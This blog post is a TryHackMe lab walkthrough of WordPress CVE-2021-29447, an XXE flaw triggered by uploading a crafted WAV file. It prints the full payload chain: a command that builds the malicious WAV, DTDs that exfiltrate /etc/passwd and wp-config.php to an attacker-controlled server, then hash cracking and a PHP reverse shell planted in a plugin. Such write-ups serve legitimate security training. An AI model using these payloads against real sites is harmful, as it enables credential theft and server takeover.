---
title: TryHackMe Wordpress CVE-2021-29447
date: 2021-08-29T14:35:45+05:30
lastmod: 2021-08-29T14:35:45+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://bit.ly/34sGFiK
cover:
  image: /img/thm.gif
  alt: "cover image"

categories:
  - TryHackMe
tags:
  - tryhackme
  - rooms
  - thm

draft: false
description: TryHackMe Room wordpress-CVE-2021-29447 solved by Animesh Roy. this is a walkthough. read more...

---

## OverView

|||
|---|---|
| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|Wordpress CVE-2021-29447|![logo](https://tryhackme-images.s3.amazonaws.com/room-icons/e9417007c4398491c2db96c52ef3106a.png)|
| <b> Room [Subscription Required] </b>| [Wordpress CVE-2021-29447](https://tryhackme.com/room/wordpresscve202129447)|

> Vulnerability allow a authenticated user whith low privilages upload a malicious WAV file that could lead to remote arbitrary file disclosure and server-side request forgery (SSRF).

---

## Task 01: Introduction

An XXE vulnerability consists of an injection that takes advantage of the poor configuration of the XML interpreter allowing to include external entities, this attack is performed against an application that interprets XML language in its parameters.

Researchers at security firm SonarSource have discover a xml external entity injection (XXE) security flaw in WordPress (in the Media Library) . The vulnerability can be exploited only when this CMS runs in PHP 8 and the attacking user has permissions to upload media files. 

### Impact

* **Arbitrary File Disclosure**: the content of any file on the host’s file system could be retrieved, e.g. wp-config.php which contains sensitive data such as database credentials.

* **Server-Side Request Forgery (SSRF)**: HTTP requests could be made on behalf of the WordPress installation. Depending on the environment, this can have a serious impact.

### Exploiting the vulnerability

A wordpress site affected by this vulnerability has been identified in the enumeration process with the help of the wpscan tool.

![img-cen](https://i.imgur.com/mrPwSpA.png)

It has been identified that the author user uses weak credentials.

     user: test-corp
     password: test

![img-cen](https://i.imgur.com/tw7QtLJ.png)

user with permissions for upload media files.

### Creating a malicious WAV file.

It's very easy, in your bash console

```bash
cat poc.wav
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://YOURSEVERIP:PORT/NAMEEVIL.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

In your attacker pc create a dtd with the code execute in the web server.

```xml
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >
```

Note: for read wordpress files use the syntax "../WP-FILE.php"

```xml
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=../index.php">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >
```

Now up a http server in the folder that created the file.

`php -S 0.0.0.0:PORT`

Now upload the malicious wav

![img-cen](https://i.imgur.com/MkcDIN4.png)

When upload the malicious wav in your server you'll see this output, for this exercise I used zlib library for this razon it's necesary use for decode the base64.

Create a php file whith the code:

```php
<?php
echo zlib_decode(base64_decode('base64her'));
```

php FILENAME.php

![img-cen](https://i.imgur.com/yepzG1E.png)

why this?  It is the method that has been used to read sensitive wordpres files.

Other method for read local files in the web server is:

```xml
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >
```

For decode this is very easy, in bash console use:

`echo "base64" | base64 -d`

END.

---
<!-- Google Ads -->
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<!-- END -->

---

## Task 02: Ready Set Go

### payload

* payload.wav

```bash
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.17.4.40/payload.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

* Payload.dtd

```xml
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=../wp-config.php">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.17.4.40/?p=%file;'>" >
```

* hosted with PHP

```bash
php -S IP 80
```

* got the callback
  
![img](https://i.imgur.com/QnasAQU.png)

### 2.1: Use the vulnerability CVE-2021-29447 to read the wordpres configuration file

`n/a`

### 2.2: Based on the results of #1, what is the name of the database for WordPress?

![img](https://i.imgur.com/ClA0VuR.png)

![img](https://i.imgur.com/HJP5MAK.png)

### 2.3: Based on the results of #1, what are the credentials you found?

![img](https://i.imgur.com/HJP5MAK.png)

### 2.4: Enurate and identify what is the dbms installed on the server?

**Ans is on `wp-config` pate itself**

### 2.5: Based on the results of #4, what is the dbms version installed on the server?

* look if DB is open for remote access:
  
  ![img](https://i.imgur.com/qZSxveH.png)

* Connect and verify the version:
  
  ![img](https://i.imgur.com/UeODWB2.png)

### 2.6: Based on the results of #4, what port is the dbms running on?

* nmap san reveals

     ![img](https://i.imgur.com/qZSxveH.png)

### 2.7: Compromise the dbms, What is the encrypted password located in the wordpress  users table with id 1??

* find all DB:
  
  ![img](https://i.imgur.com/iggMqNW.png)

* use `wordpress` DB and see all tables:
  
  ![img](https://i.imgur.com/SMOtGmz.png)

* let's read the `user tables`:
  
  ![img](https://i.imgur.com/gbw4kx3.png)

* read the flag:
  
  ![img](https://i.imgur.com/6oaqpYk.png)
  
### 2.8: Based on the results of #7, What is the password in plaint text?

* save the hash in your machine
* run John:
  
  ![img](https://i.imgur.com/gemkNe3.png)

### 2.9: Compromise the machine and locate flag.txt

* tried bruteforce with the found `usernames` & `password` for `SSH` and failed.

* let's login with newly found creds on website.

* login worked for the website! and we're into admin account!

* let's upload a php web-shell and gain access that way
* Copy `cp /usr/share/laudanum/php/php-reverse-shell.php shell.php` shell to current directory and change IP & port
* upload the code to the webpage, I'm uploading to `404.php` 
* seems we can't edit `themes`
* let's try with `plugins`
* we can edit `plugins`:
  
  ![img](https://i.imgur.com/po7TwWx.png)

* let's call that page and get the backdoor call:
  
  ![img](https://i.imgur.com/Y3aLJo9.png)

* find the `flag.txt`
  
  ![img](https://i.imgur.com/K26N7sZ.png)

* read the file:
  
  ![img](https://i.imgur.com/IXLTBTw.png)


---
<!-- Google Ads -->

<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<!-- END -->


<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="anir0y" data-description="Support me on Buy me a coffee!" data-message="" data-color="#5F7FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

<!-- EOF -->
